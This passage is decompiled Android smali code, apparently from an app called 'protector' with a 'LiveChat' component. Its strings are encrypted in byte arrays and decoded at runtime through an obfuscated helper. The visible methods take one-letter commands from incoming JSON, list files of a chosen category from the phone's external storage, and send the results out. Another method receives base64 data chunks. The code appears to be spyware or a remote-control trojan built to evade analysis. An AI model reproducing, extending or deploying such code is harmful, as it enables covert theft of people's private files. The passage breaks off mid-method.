    .array-data 1
        0x5bt
        -0x5dt
        0x4t
        -0x6ct
        0x32t
    .end array-data

    nop

    :array_25
    .array-data 1
        0x3et
        -0x32t
        0x74t
        -0x20t
        0x4bt
        0x68t
        -0x2at
        -0x79t
    .end array-data

    :array_26
    .array-data 1
        0x1bt
        0x57t
        -0x74t
        0x4et
        0x53t
        -0x65t
        0x1t
    .end array-data

    :array_27
    .array-data 1
        0x70t
        0x35t
        -0x1t
        0x3at
        0x32t
        -0x11t
        0x64t
        0x37t
    .end array-data

    :array_28
    .array-data 1
        0x1at
        0x47t
        0x8t
        0x4bt
        -0x4at
    .end array-data

    nop

    :array_29
    .array-data 1
        0x7ft
        0x2at
        0x78t
        0x3ft
        -0x31t
        0x34t
        -0x45t
        -0x38t
    .end array-data

    :array_2a
    .array-data 1
        -0x2dt
        -0x4bt
        -0x57t
        -0x33t
        0x22t
        -0x60t
        -0x6ct
        0x34t
    .end array-data

    :array_2b
    .array-data 1
        0x73t
        -0x4t
        -0x3t
        0xdt
        0x7bt
        0x41t
        0x21t
        0x28t
    .end array-data

    :array_2c
    .array-data 1
        -0x2at
        -0x75t
        0x70t
        0x5ft
        0x7ft
        -0x7t
        -0x14t
        -0x65t
    .end array-data

    :array_2d
    .array-data 1
        -0x60t
        -0x1ct
        0x1ct
        0x2ct
        0xbt
        -0x68t
        -0x68t
        -0x2t
    .end array-data

    :array_2e
    .array-data 1
        -0x24t
        0x4t
        -0x39t
        -0x68t
        0x1at
    .end array-data

    nop

    :array_2f
    .array-data 1
        -0x47t
        0x69t
        -0x49t
        -0x14t
        0x63t
        -0x3ct
        0x8t
        -0x22t
    .end array-data

    :array_30
    .array-data 1
        -0x58t
        -0x5ft
        -0x5at
        0x19t
        -0x58t
        0x33t
        -0x8t
        -0x54t
    .end array-data

    :array_31
    .array-data 1
        -0x32t
        0x9t
        -0x55t
        0x45t
        0x61t
        -0x1t
        0x71t
        -0x7ft
    .end array-data

    :array_32
    .array-data 1
        0x60t
        -0x7ct
        0x6ft
        0x2ft
        -0x24t
        -0x3ft
        -0x6bt
        -0x3t
    .end array-data

    :array_33
    .array-data 1
        0x13t
        -0x16t
        0xet
        0x5ft
        -0x58t
        -0x48t
        -0x1bt
        -0x68t
    .end array-data

    :array_34
    .array-data 1
        0x14t
        0x35t
        0xet
        -0x37t
        0x71t
    .end array-data

    nop

    :array_35
    .array-data 1
        0x71t
        0x58t
        0x7et
        -0x43t
        0x8t
        -0x27t
        -0x6bt
        0x2ft
    .end array-data

    :array_36
    .array-data 1
        0x3dt
        0x16t
        0x31t
        -0x2t
        -0x19t
        -0xbt
        0xbt
        -0x4bt
    .end array-data

    :array_37
    .array-data 1
        0x37t
        0x2at
        0x5at
        -0x6bt
        0x64t
        -0x2at
        -0x47t
        0x77t
    .end array-data

    :array_38
    .array-data 1
        -0x37t
        0x5bt
        0x7t
        0x2at
        0x53t
        -0x65t
        -0x1bt
        0x6bt
    .end array-data

    :array_39
    .array-data 1
        -0x5ct
        0x34t
        0x71t
        0x4ft
        0x27t
        -0x1et
        -0x6bt
        0xet
    .end array-data

    :array_3a
    .array-data 1
        -0x53t
        0x7ft
        0x74t
        -0x2ft
        0x40t
    .end array-data

    nop

    :array_3b
    .array-data 1
        -0x38t
        0x12t
        0x4t
        -0x5bt
        0x39t
        0x18t
        0x6dt
        -0x75t
    .end array-data

    :array_3c
    .array-data 1
        -0x6at
        0x30t
        0x7t
        -0x19t
        0x1dt
        0x79t
        0x46t
        -0x47t
    .end array-data

    :array_3d
    .array-data 1
        0x47t
        0x1bt
        -0x6ct
    .end array-data

    :array_3e
    .array-data 1
        0x37t
        0x74t
        -0x3t
        -0x7t
        0x7at
        -0x42t
        0x59t
        -0x72t
    .end array-data

    :array_3f
    .array-data 1
        0x4ct
        0x6at
        -0x4et
        -0xet
        -0x5bt
    .end array-data

    nop

    :array_40
    .array-data 1
        0x29t
        0x7t
        -0x3et
        -0x7at
        -0x24t
        0x77t
        0x77t
        -0x6ft
    .end array-data

    :array_41
    .array-data 1
        -0x59t
        0x4t
        0x21t
        -0x79t
        -0x48t
    .end array-data

    nop

    :array_42
    .array-data 1
        -0x3et
        0x69t
        0x51t
        -0xdt
        -0x3ft
        0x7bt
        0x79t
        -0x7dt
    .end array-data

    :array_43
    .array-data 1
        -0x36t
        0x50t
        0x14t
        0xbt
        -0x3bt
        0x23t
        -0x71t
        -0x11t
    .end array-data

    :array_44
    .array-data 1
        0x65t
        0x3at
        -0x74t
        -0x66t
        -0x3t
        0x46t
        -0x4ft
        -0x73t
    .end array-data

    :array_45
    .array-data 1
        0x9t
        -0x5bt
        0x75t
    .end array-data

    :array_46
    .array-data 1
        0x71t
        -0x61t
        0x55t
        -0x62t
        0x30t
        -0xct
        -0x2ft
        -0x32t
    .end array-data

    :array_47
    .array-data 1
        -0x2ft
        0x11t
        -0x63t
        0x39t
        -0x6t
    .end array-data

    nop

    :array_48
    .array-data 1
        -0x3t
        0x31t
        -0x1ct
        0x3t
        -0x26t
        0x1t
        0x30t
        -0x25t
    .end array-data

    :array_49
    .array-data 1
        0x43t
        0x19t
        0xct
        -0x3dt
        -0x71t
        0x3bt
        -0x4bt
        -0x45t
        0x31t
        0x19t
        0x2t
        -0x2at
        -0x6et
        0x34t
        -0x10t
        -0x51t
        0x7et
        0x15t
        0x1t
        -0x2et
        -0x3at
        0x3et
        -0x5ct
        -0x53t
        0x78t
        0x12t
        0x8t
    .end array-data

    :array_4a
    .array-data 1
        0x11t
        0x7ct
        0x6ft
        -0x5at
        -0x1at
        0x4dt
        -0x30t
        -0x21t
    .end array-data

    :array_4b
    .array-data 1
        0x49t
        -0x27t
        0x57t
        -0x1dt
        -0x35t
        0x66t
        0x5ft
        -0x72t
    .end array-data

    :array_4c
    .array-data 1
        0x5et
        -0x72t
        0x4ft
    .end array-data

    :array_4d
    .array-data 1
        0x2et
        -0x1ft
        0x26t
        0x22t
        0x46t
        -0x41t
        -0x77t
        -0x12t
    .end array-data

    :array_4e
    .array-data 1
        0x74t
        -0x25t
        0x45t
        0x10t
        0x61t
    .end array-data

    nop

    :array_4f
    .array-data 1
        0x11t
        -0x4at
        0x35t
        0x64t
        0x18t
        -0x19t
        -0x41t
        -0x69t
    .end array-data

    :array_50
    .array-data 1
        -0x4ft
        -0x2at
        0x25t
        -0x2at
        0x75t
        -0x1ct
        -0x51t
        -0x38t
    .end array-data

    :array_51
    .array-data 1
        0x11t
        -0x1ft
        -0x19t
        0x42t
        -0x1et
        0x36t
        -0x63t
        0x9t
    .end array-data

    :array_52
    .array-data 1
        0x62t
        0x77t
        -0x56t
        0x1at
        -0x75t
        -0xft
        0x6ct
        -0x2t
    .end array-data

    :array_53
    .array-data 1
        0x0t
        0x12t
    .end array-data

    nop

    :array_54
    .array-data 1
        0x2ct
        0x32t
        -0x65t
        -0x59t
        -0x54t
        -0x49t
        0x34t
        0x61t
    .end array-data

    :array_55
    .array-data 1
        -0x37t
        -0x39t
        -0x9t
        -0x10t
        0x27t
        0x2ct
        -0x67t
    .end array-data

    :array_56
    .array-data 1
        -0x46t
        -0x54t
        -0x7ct
        -0x7ct
        0x46t
        0x58t
        -0x4t
        -0x7ft
    .end array-data

    :array_57
    .array-data 1
        0x36t
        -0x49t
        0xat
        -0x10t
        -0x77t
    .end array-data

    nop

    :array_58
    .array-data 1
        0x53t
        -0x26t
        0x7at
        -0x7ct
        -0x10t
        -0x58t
        -0x41t
        0x3ft
    .end array-data

    :array_59
    .array-data 1
        0xct
        -0x32t
        0x3dt
        0x31t
        -0x4dt
        -0x32t
        -0x4ft
        -0xdt
    .end array-data

    :array_5a
    .array-data 1
        0x1bt
        0x4dt
        -0x34t
        -0x50t
        0x3dt
        0x31t
        -0x1at
        0x3at
    .end array-data

    :array_5b
    .array-data 1
        -0x50t
        0x24t
        -0x27t
    .end array-data

    :array_5c
    .array-data 1
        -0x2dt
        0x48t
        -0x55t
        -0x57t
        0x19t
        0x24t
        0x47t
        -0x7at
    .end array-data

    :array_5d
    .array-data 1
        -0x16t
        -0x5at
        0x35t
        -0x42t
        0x67t
    .end array-data

    nop

    :array_5e
    .array-data 1
        -0x71t
        -0x35t
        0x45t
        -0x36t
        0x1et
        -0x32t
        0x7dt
        -0x7bt
    .end array-data

    :array_5f
    .array-data 1
        0x19t
        0x66t
        -0x1et
    .end array-data

    :array_60
    .array-data 1
        0x6dt
        0x1et
        -0x6at
        0x7bt
        0x2dt
        0x37t
        -0x8t
        -0x25t
    .end array-data

    :array_61
    .array-data 1
        -0x3at
        -0x4et
        0x20t
        -0x3dt
        0x21t
    .end array-data

    nop

    :array_62
    .array-data 1
        -0x5dt
        -0x21t
        0x50t
        -0x49t
        0x58t
        0x61t
        -0x35t
        0x48t
    .end array-data

    :array_63
    .array-data 1
        -0x43t
        -0x1ct
        -0x32t
        -0x14t
        -0x21t
        -0x60t
        0x23t
        0x5dt
        -0x55t
        -0x13t
    .end array-data

    nop

    :array_64
    .array-data 1
        -0x21t
        -0x78t
        -0x5ft
        -0x71t
        -0x4ct
        -0x2dt
        0x57t
        0x3ct
    .end array-data

    :array_65
    .array-data 1
        -0x4et
        -0x64t
        0x5bt
        0x11t
        -0x76t
    .end array-data

    nop

    :array_66
    .array-data 1
        -0x29t
        -0xft
        0x2bt
        0x65t
        -0xdt
        0x4et
        0x4bt
        0x41t
    .end array-data

    :array_67
    .array-data 1
        -0x22t
        0x6ct
        0x3ct
        -0x19t
        -0x2t
        0x7bt
        -0x74t
        -0x7et
    .end array-data

    :array_68
    .array-data 1
        0x4et
        -0x61t
        -0x6bt
        0x6dt
        0x5t
        0x69t
    .end array-data

    nop

    :array_69
    .array-data 1
        0x2ct
        -0xdt
        -0x2t
        0x0t
        0x76t
        0xet
        0x59t
        0x19t
    .end array-data

    :array_6a
    .array-data 1
        -0x1ft
        0x63t
        -0x37t
        0x27t
        0x1t
        0x4bt
        0x11t
        -0x62t
    .end array-data

    :array_6b
    .array-data 1
        0x34t
        -0x7bt
        -0x6et
        0x28t
        -0x15t
        -0x7bt
        -0x21t
        -0x5t
        0xet
        -0x7ft
        -0x67t
        0x22t
    .end array-data

    :array_6c
    .array-data 1
        0x7ct
        -0x1ct
        -0x4t
        0x4ct
        -0x79t
        -0x20t
        -0x74t
        -0x68t
    .end array-data
.end method

.method private m(Lorg/json/JSONObject;)V
    .locals 11

    .line 1
    const/16 v0, 0xd

    const/4 v1, 0x4

    const/16 v2, 0x8

    :try_start_0
    new-array v3, v1, [B

    fill-array-data v3, :array_0

    new-array v4, v2, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x5

    new-array v5, v4, [B

    fill-array-data v5, :array_2

    new-array v6, v2, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p1, v3, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v3

    const/16 v5, 0x61

    const/4 v6, 0x3

    const/4 v7, 0x2

    const/4 v8, 0x0

    const/4 v9, 0x1

    if-eq v3, v5, :cond_3

    const/16 v5, 0x64

    if-eq v3, v5, :cond_2

    const/16 v5, 0x69

    if-eq v3, v5, :cond_1

    const/16 v5, 0x76

    if-eq v3, v5, :cond_0

    goto :goto_0

    :cond_0
    new-array v3, v9, [B

    const/16 v5, 0x23

    aput-byte v5, v3, v8

    new-array v5, v2, [B

    fill-array-data v5, :array_4

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    move p1, v9

    goto :goto_1

    :catch_0
    move-exception p1

    goto/16 :goto_3

    :cond_1
    new-array v3, v9, [B

    const/16 v5, 0x3f

    aput-byte v5, v3, v8

    new-array v5, v2, [B

    fill-array-data v5, :array_5

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    move p1, v8

    goto :goto_1

    :cond_2
    new-array v3, v9, [B

    const/16 v5, -0x41

    aput-byte v5, v3, v8

    new-array v5, v2, [B

    fill-array-data v5, :array_6

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    move p1, v6

    goto :goto_1

    :cond_3
    new-array v3, v9, [B

    const/16 v5, 0x45

    aput-byte v5, v3, v8

    new-array v5, v2, [B

    fill-array-data v5, :array_7

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    move p1, v7

    goto :goto_1

    :cond_4
    :goto_0
    const/4 p1, -0x1

    :goto_1
    if-eqz p1, :cond_8

    if-eq p1, v9, :cond_7

    if-eq p1, v7, :cond_6

    if-eq p1, v6, :cond_5

    const/4 p1, 0x0

    goto :goto_2

    :cond_5
    sget-object p1, Lcom/icontrol/protector/d$b;->i:Lcom/icontrol/protector/d$b;

    goto :goto_2

    :cond_6
    sget-object p1, Lcom/icontrol/protector/d$b;->h:Lcom/icontrol/protector/d$b;

    goto :goto_2

    :cond_7
    sget-object p1, Lcom/icontrol/protector/d$b;->g:Lcom/icontrol/protector/d$b;

    goto :goto_2

    :cond_8
    sget-object p1, Lcom/icontrol/protector/d$b;->f:Lcom/icontrol/protector/d$b;

    :goto_2
    const/16 v3, 0xb

    if-nez p1, :cond_9

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v1, v3, [B

    fill-array-data v1, :array_8

    new-array v3, v2, [B

    fill-array-data v3, :array_9

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x13

    new-array v3, v3, [B

    fill-array-data v3, :array_a

    new-array v4, v2, [B

    fill-array-data v4, :array_b

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {p1, v1, v3}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_9
    iget-object v5, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v6

    invoke-static {v5, p1, v6}, Lcom/icontrol/protector/e;->b(Landroid/content/Context;Lcom/icontrol/protector/d$b;Ljava/io/File;)[Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_b

    aget-object v6, v5, v8

    aget-object v5, v5, v9

    new-array v9, v9, [B

    const/16 v10, -0x29

    aput-byte v10, v9, v8

    new-array v8, v2, [B

    fill-array-data v8, :array_c

    invoke-static {v9, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v8, :cond_a

    :try_start_1
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    new-array v3, v1, [B

    fill-array-data v3, :array_d

    new-array v6, v2, [B

    fill-array-data v6, :array_e

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v6, v1, [B

    fill-array-data v6, :array_f

    new-array v7, v2, [B

    fill-array-data v7, :array_10

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v3, v4, [B

    fill-array-data v3, :array_11

    new-array v4, v2, [B

    fill-array-data v4, :array_12

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1}, Ljava/lang/Enum;->name()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p1, v1, [B

    fill-array-data p1, :array_13

    new-array v1, v2, [B

    fill-array-data v1, :array_14

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v0, p1}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_4

    :cond_a
    :try_start_2
    new-array p1, v7, [B

    fill-array-data p1, :array_15

    new-array v1, v2, [B

    fill-array-data v1, :array_16

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v6, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_c

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v1, v3, [B

    fill-array-data v1, :array_17

    new-array v3, v2, [B

    fill-array-data v3, :array_18

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1, v5}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_4

    :cond_b
    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v1, v3, [B

    fill-array-data v1, :array_19

    new-array v3, v2, [B

    fill-array-data v3, :array_1a

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v3, v0, [B

    fill-array-data v3, :array_1b

    new-array v4, v2, [B

    fill-array-data v4, :array_1c

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {p1, v1, v3}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_4

    :goto_3
    new-array v0, v0, [B

    fill-array-data v0, :array_1d

    new-array v1, v2, [B

    fill-array-data v1, :array_1e

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :catch_1
    :cond_c
    :goto_4
    return-void

    :array_0
    .array-data 1
        0x67t
        -0x58t
        0x25t
        0x26t
    .end array-data

    :array_1
    .array-data 1
        0x14t
        -0x32t
        0x4at
        0x54t
        -0x35t
        0x75t
        0x70t
        0x3ct
    .end array-data

    :array_2
    .array-data 1
        0x9t
        0x1t
        0x19t
        -0x80t
        -0x6ct
    .end array-data

    nop

    :array_3
    .array-data 1
        0x6ct
        0x6ct
        0x69t
        -0xct
        -0x13t
        -0x28t
        -0x8t
        -0x67t
    .end array-data

    :array_4
    .array-data 1
        0x55t
        -0x57t
        0x31t
        -0x4bt
        -0x4et
        0x4bt
        -0x2bt
        0x20t
    .end array-data

    :array_5
    .array-data 1
        0x56t
        0x7ct
        -0x1bt
        -0x2bt
        0x4et
        0x2dt
        0x43t
        -0x1ct
    .end array-data

    :array_6
    .array-data 1
        -0x25t
        -0x50t
        0x50t
        0x2ct
        0x6bt
        0x6t
        0x35t
        0x63t
    .end array-data

    :array_7
    .array-data 1
        0x24t
        -0x2ct
        0x62t
        -0x43t
        0x2t
        0x8t
        0x66t
        0x28t
    .end array-data

    :array_8
    .array-data 1
        -0x5ct
        -0x4ct
        0x7t
        0x1bt
        -0x70t
        0x5bt
        -0x4ft
        0x2at
        -0x7at
        -0x48t
        0x19t
    .end array-data

    :array_9
    .array-data 1
        -0x1et
        -0x23t
        0x6bt
        0x7et
        -0x50t
        0x1dt
        -0x28t
        0x44t
    .end array-data

    :array_a
    .array-data 1
        0x30t
        0x78t
        -0x61t
        0x73t
        -0x52t
        0x52t
        0x3at
        -0x7et
        0x16t
        0x73t
        -0x6bt
        0x6ft
        -0x5et
        0x4dt
        0x74t
        -0x2at
        0x1ct
        0x66t
        -0x6ft
    .end array-data

    :array_b
    .array-data 1
        0x65t
        0x16t
        -0xct
        0x1dt
        -0x3ft
        0x25t
        0x54t
        -0x5et
    .end array-data

    :array_c
    .array-data 1
        -0x1at
        -0x23t
        -0x7bt
        -0x10t
        -0x73t
        -0x6t
        -0x22t
        -0x65t
    .end array-data

    :array_d
    .array-data 1
        0x58t
        -0x5bt
        0x12t
        -0x7dt
    .end array-data

    :array_e
    .array-data 1
        0x2ct
        -0x24t
        0x62t
        -0x1at
        0x23t
        0x48t
        -0x3dt
        0x7at
    .end array-data

    :array_f
    .array-data 1
        -0x57t
        0x6at
        0x67t
        0x4dt
    .end array-data

    :array_10
    .array-data 1
        -0x26t
        0x18t
        0x4t
        0x25t
        -0x5et
        -0x57t
        0x1at
        -0x3ct
    .end array-data

    :array_11
    .array-data 1
        -0x14t
        -0x26t
        0x53t
        0x24t
        -0x65t
    .end array-data

    nop

    :array_12
    .array-data 1
        -0x61t
        -0x52t
        0x2at
        0x54t
        -0x2t
        0x72t
        0x5ft
        0x77t
    .end array-data

    :array_13
    .array-data 1
        -0x2bt
        -0x2at
        0x67t
        0x39t
    .end array-data

    :array_14
    .array-data 1
        -0x5bt
        -0x5et
        0xft
        0x4at
        0x56t
        0x5ct
        0xdt
        -0x47t
    .end array-data

    :array_15
    .array-data 1
        -0x10t
        0x72t
    .end array-data

    nop

    :array_16
    .array-data 1
        -0x23t
        0x43t
        0x77t
        -0x1et
        -0x52t
        0x4at
        -0x21t
        -0x61t
    .end array-data

    :array_17
    .array-data 1
        0x37t
        -0x23t
        -0x7bt
        -0x41t
        -0x1ft
        0x9t
        -0x26t
        0x58t
        0x15t
        -0x2ft
        -0x65t
    .end array-data

    :array_18
    .array-data 1
        0x71t
        -0x4ct
        -0x17t
        -0x26t
        -0x3ft
        0x4ft
        -0x4dt
        0x36t
    .end array-data

    :array_19
    .array-data 1
        0x48t
        0x27t
        -0x20t
        -0x4at
        0x7et
        0x50t
        -0x54t
        0x14t
        0x6at
        0x2bt
        -0x2t
    .end array-data

    :array_1a
    .array-data 1
        0xet
        0x4et
        -0x74t
        -0x2dt
        0x5et
        0x16t
        -0x3bt
        0x7at
    .end array-data

    :array_1b
    .array-data 1
        0x66t
        0x3at
        0x7ct
        0x2et
        -0x4t
        0x5ft
        0x4t
        -0x8t
        0x47t
        0x36t
        0x78t
        0x3bt
        -0x5bt
    .end array-data

    nop

    :array_1c
    .array-data 1
        0x22t
        0x5bt
        0x8t
        0x4ft
        -0x24t
        0x36t
        0x77t
        -0x28t
    .end array-data

    :array_1d
    .array-data 1
        -0x13t
        0x71t
        -0x5dt
        -0x56t
        0x71t
        0x4ft
        -0x7ft
        0xet
        -0x3at
        0x71t
        -0x47t
        -0x5ft
        0x73t
    .end array-data

    nop

    :array_1e
    .array-data 1
        -0x5bt
        0x10t
        -0x33t
        -0x32t
        0x1dt
        0x2at
        -0x33t
        0x61t
    .end array-data
.end method

.method private n(Lorg/json/JSONObject;)V
    .locals 16

    .line 1
    move-object/from16 v1, p0

    move-object/from16 v0, p1

    const/16 v2, 0x8

    :try_start_0
    new-array v3, v2, [B

    fill-array-data v3, :array_0

    new-array v4, v2, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x5

    new-array v5, v4, [B

    fill-array-data v5, :array_2

    new-array v6, v2, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v3, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-array v5, v2, [B

    fill-array-data v5, :array_4

    new-array v6, v2, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v6, v4, [B

    fill-array-data v6, :array_6

    new-array v7, v2, [B

    fill-array-data v7, :array_7

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v5, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x7

    new-array v6, v6, [B

    fill-array-data v6, :array_8

    new-array v7, v2, [B

    fill-array-data v7, :array_9

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x1

    new-array v8, v7, [B

    const/16 v9, 0x2c

    const/4 v10, 0x0

    aput-byte v9, v8, v10

    new-array v9, v2, [B

    fill-array-data v9, :array_a

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v6, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-array v4, v4, [B

    fill-array-data v4, :array_b

    new-array v8, v2, [B

    fill-array-data v8, :array_c

    invoke-static {v4, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v8, v7, [B

    const/16 v9, -0x2f

    aput-byte v9, v8, v10

    new-array v9, v2, [B

    fill-array-data v9, :array_d

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v4, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    new-array v8, v2, [B

    fill-array-data v8, :array_e

    new-array v9, v2, [B

    fill-array-data v9, :array_f

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    const-string v9, ""

    invoke-virtual {v0, v8, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/16 v9, 0x9

    new-array v11, v9, [B

    fill-array-data v11, :array_10

    new-array v12, v2, [B

    fill-array-data v12, :array_11

    invoke-static {v11, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    const-wide/16 v12, 0x0

    invoke-virtual {v0, v11, v12, v13}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v14

    new-array v11, v2, [B

    fill-array-data v11, :array_12

    new-array v9, v2, [B

    fill-array-data v9, :array_13

    invoke-static {v11, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9, v12, v13}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    const/16 v9, 0xb

    new-array v9, v9, [B

    fill-array-data v9, :array_14

    new-array v11, v2, [B

    fill-array-data v11, :array_15

    invoke-static {v9, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9, v10}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    const/4 v0, 0x2

    invoke-static {v8, v0}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v0

    iget-object v8, v1, Lcom/icontrol/protector/LiveChat$a;->a:Ljava/util/Map;

    invoke-interface {v8, v3}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v8

    if-nez v8, :cond_0

    iget-object v8, v1, Lcom/icontrol/protector/LiveChat$a;->a:Ljava/util/Map;

    new-instance v9, Ljava/util/ArrayList;

